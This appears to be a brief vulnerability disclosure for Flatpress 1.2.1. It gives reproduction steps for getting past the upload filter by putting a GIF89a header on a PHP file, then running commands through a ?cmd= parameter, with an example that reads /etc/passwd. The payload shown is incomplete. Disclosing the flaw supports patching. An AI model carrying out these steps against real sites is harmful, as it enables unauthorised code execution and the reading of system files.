# Flatpress 1.2.1 - File Upload Bypass to RCE

**Steps to Reproduce:**

1. Login to the application
2. Navigate to the uploader section of the application
3. Create a PHP file using the following payload: `GIF89a;`
4. Upload created php file
5. Navigate to file from media manager and open file
6. Append the following payload after file to give input commands:

```
?cmd=cat+/etc/passwd
```
